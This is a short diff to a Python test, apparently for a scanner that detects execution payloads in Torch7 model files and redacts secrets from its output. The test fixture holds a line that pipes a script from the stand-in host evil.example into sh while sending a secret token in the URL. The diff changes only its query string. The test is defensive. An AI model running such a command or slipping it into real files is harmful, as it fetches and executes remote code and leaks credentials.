@@ -88,7 +88,7 @@ def test_scan_redacts_sensitive_torch7_execution_examples(tmp_path: Path) -> Non
     secret_value = "SENSITIVEVALUE1234567890"
     payload = (
         b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
-        + f"cmd = os.execute('curl https://evil.example/payload.sh?token={secret_value} | sh')\n".encode()
+        + f"cmd = os.execute('curl https://evil.example/payload.sh?ok=1;token={secret_value} | sh')\n".encode()
         + f"client_secret = {secret_value}\n".encode()
     )
     path = _write_torch7_file(tmp_path, payload, filename="redacted.t7")
